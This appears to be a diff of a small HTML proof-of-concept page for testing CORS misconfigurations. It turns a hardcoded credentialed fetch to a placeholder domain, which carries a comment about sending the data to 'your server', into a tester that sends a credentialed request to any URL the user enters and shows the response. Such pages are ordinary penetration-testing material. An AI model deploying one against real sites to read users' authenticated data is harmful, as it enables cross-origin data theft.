@@ -1,20 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS PoC</title>
+  <title>CORS PoC Tester</title>
 </head>
 <body>
-  <h1>CORS Misconfiguration PoC</h1>
+  <h2>Dynamic CORS Misconfiguration Tester</h2>
+  <input type="text" id="targetUrl" placeholder="Enter target URL">
+  <button onclick="sendRequest()">Send Request</button>
+  <pre id="output">Waiting for input...</pre>
+
   <script>
-    fetch('https://vulnerable-domain.com/endpoint', {
-      credentials: 'include'
-    })
-    .then(response => response.text())
-    .then(data => {
-      console.log('Response:', data);
-      // Optionally, send data to your server
-    })
-    .catch(error => console.error('Error:', error));
+    function sendRequest() {
+      const url = document.getElementById('targetUrl').value;
+      const output = document.getElementById('output');
+
+      output.textContent = 'Sending request to: ' + url;
+
+      fetch(url, { credentials: 'include' })
+        .then(res => res.text())
+        .then(data => {
+          output.textContent = '✅ Response:\n\n' + data;
+        })
+        .catch(err => {
+          output.textContent = '❌ Error:\n\n' + err;
+        });
+    }
   </script>
 </body>
 </html>
